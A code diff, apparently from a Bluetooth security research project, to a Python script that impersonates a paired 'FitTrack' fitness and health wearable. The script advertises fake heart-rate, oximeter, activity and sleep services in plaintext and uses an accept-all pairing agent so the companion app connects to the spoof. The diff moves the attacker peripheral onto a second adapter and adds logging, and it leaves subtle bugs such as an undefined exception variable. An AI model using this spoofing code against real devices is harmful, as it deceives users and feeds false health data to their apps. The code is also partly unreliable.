@@ -1,6 +1,6 @@
 import asyncio
 from asyncio import Queue, Event, create_task
-from bluez_peripheral.util import get_message_bus, is_bluez_available
+from bluez_peripheral.util import Adapter, get_message_bus, is_bluez_available
 from bluez_peripheral.advert import Advertisement
 from bluez_peripheral.gatt.service import ServiceCollection
 from bluez_peripheral.gatt.characteristic import CharacteristicFlags as CF
@@ -10,14 +10,22 @@ from services.fake_heart_rate_service import HEARTRATE_SERVICE, FakeHeartRateSer
 from services.fake_pulse_oximeter_service import PULSEOXIMETER_SERVICE, FakePulseOximeterService
 from services.fake_physical_activity_monitor_service import PHYSICAL_ACTIVITY_SERVICE, FakePhysicalActivityMonitorService
 from services.fake_sleep_monitor_service import SLEEP_MONITOR_SERVICE, FakeSleepMonitorService
-from utils.adapter_utils import set_adapter_alias, set_adapter_discoverable, set_adapter_powered
+from utils.adapter_utils import set_adapter_alias, set_adapter_discoverable, set_adapter_powered, find_adapter_props
 from utils.btmgmt_utils import setup_btmgmt
 import os
+import logging
 
-DEVICE_NAME = "Secured FitTrack"
+DEVICE_NAME = "FitTrack"
 RED = "\033[91m"
 RESET = "\033[0m"
 YELLOW = "\033[93m"
+
+logging.basicConfig(
+    level=logging.DEBUG,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%H:%M:%S"
+)
+logger = logging.getLogger(__name__)
 
 
 async def queue_control_consumer(service: FakePhysicalActivityMonitorService | FakeSleepMonitorService, queue: Queue, stop_event: Event):
@@ -140,9 +148,6 @@ async def stdin_reader_and_dispatch(pams_queue: Queue, sams_queue: Queue, stop_e
 
 
 async def main():
-    if setup_btmgmt() == False:
-        return
-
     # for this attack the client (app smartphone device) will already be paired with the real ble peripheral
     # we advertise the fake ble peripheral with characterstics in plaintext and the app should accept this
     # because the app will be scanning for names the attack goes through
@@ -167,9 +172,47 @@ async def main():
         print("BlueZ not available on system bus")
         return
 
+    # finds the path for hci1, because we will run the attacker peripheral on a bluetooth toggle
+    adapter_path, _ = await find_adapter_props(bus)
     await set_adapter_powered(bus)
     await set_adapter_discoverable(bus)
-    await set_adapter_powered(bus)
+
+    # map adapter path
+    adapters = await Adapter.get_all(bus)
+    adapter_obj = None
+    for a in adapters:
+        obj_path = a._proxy.path
+        path_attr = a._proxy.path
+        logger.debug("Proxy Bus: %s", a._proxy.bus)
+        logger.debug("Proxy Bus name: %s", a._proxy.bus_name)
+        logger.debug("Proxy Bus path: %s", a._proxy.path)
+
+        logger.debug(
+            "Inspecting adapter object: proxy.object_path=%s, path=%s", obj_path, path_attr)
+
+        try:
+            if obj_path is not None and obj_path == adapter_path:
+                adapter_obj = a
+                logger.info("Found adapter by proxy.object_path: %s", obj_path)
+                break
+
+        except Exception:
+            logger.warning("Exception while inspecting adapter: %s", e)
+            continue
+
+    if adapter_obj is None:
+        # fallback: try find by suffix 'hci1'
+        for a in adapters:
+            try:
+                if getattr(a.proxy, "object_path", "").endswith("/hci1"):
+                    adapter_obj = a
+                    logger.info("Found adapter by suffix match: %s", obj_path)
+                    break
+            except Exception:
+                continue
+
+    if setup_btmgmt() == False:
+        return
 
     # NoIoAgent will accept all incoming pairing requests from all devices unconditionally, so
     # o if we paired the real device and the fake peripheral presents itself with the MAC address or device name of the real BLE peripheral,
@@ -194,7 +237,7 @@ async def main():
         services.add_service(fake_pulse_oximeter_service)
         services.add_service(fake_physical_activity_service)
         services.add_service(fake_sleep_monitor_service)
-        await services.register(bus)
+        await services.register(bus, adapter=adapter_obj)
     except Exception as e:
         print(f"Failed to register serivce: {e}")
 
@@ -214,7 +257,7 @@ async def main():
     )
 
     try:
-        await advert.register(bus)
+        await advert.register(bus, adapter=adapter_obj)
         print("-------------------Advertisment registered-----------------------")
     except Exception as e:
         print(f"Failed to register advertisement: {e}")
